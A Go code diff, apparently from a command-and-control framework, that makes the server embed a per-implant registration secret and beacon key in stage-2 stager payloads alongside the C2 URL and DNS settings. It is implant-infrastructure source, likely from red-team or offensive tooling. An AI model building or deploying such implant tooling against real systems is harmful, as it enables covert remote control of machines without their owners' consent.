@@ -1,6 +1,7 @@
 package server
 
 import (
+	"fmt"
 	"log/slog"
 	"net/http"
 	"os"
@@ -141,6 +142,17 @@ func (s *Server) buildStage2Blob(tok *db.StagerToken) error {
 		format = "exe"
 	}
 
+	// v3: create a per-implant registration secret and embed it in the stage-2,
+	// exactly like the eager generate path. Without this the stage-2 carries no
+	// secret/beacon key and (with v2 master-key auth rejected) can never
+	// register. The build is cached after the first fetch, so the secret is
+	// created only once per token.
+	beaconKey := s.serverBeaconKey()
+	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey)
+	if err != nil {
+		return fmt.Errorf("create v3 registration secret: %w", err)
+	}
+
 	stagerCfg := payload.StagerConfig{
 		ListenerID:   tok.ListenerID,
 		C2URL:        listener.C2URL,
@@ -149,6 +161,9 @@ func (s *Server) buildStage2Blob(tok *db.StagerToken) error {
 		Format:       format,
 		DNSDomain:    listener.DNSDomain,
 		DNSServer:    listener.DNSServer,
+		BeaconKey:    beaconKey,
+		RegSecretID:  regSecretID,
+		RegSecret:    regSecretB64,
 	}
 
 	agentsDir := s.cfg.Server.DataDir
